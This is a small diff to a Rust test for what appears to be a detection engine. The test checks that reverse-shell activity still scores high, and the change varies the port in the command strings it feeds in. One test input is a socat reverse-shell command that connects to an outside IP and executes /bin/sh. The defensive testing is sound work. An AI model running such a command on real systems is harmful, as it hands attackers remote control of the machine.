@@ -151,9 +151,10 @@ fn agentfix27_attack_positives_remain_high() {
         "socat TCP:10.10.123.35:50053 EXEC:/bin/sh",
     ] {
         for port in [443, 50053] {
+            let command = command.replace("50053", &port.to_string());
             let mut e = engine();
             e.process_event(&exec(10, 2, "sh", "sh", 100));
-            let child = exec(100, 10, command.split_whitespace().next().unwrap(), command, 101);
+            let child = exec(100, 10, command.split_whitespace().next().unwrap(), &command, 101);
             e.process_event(&child);
             let mut network = child;
             network.event_class = EventClass::NetworkConnect;
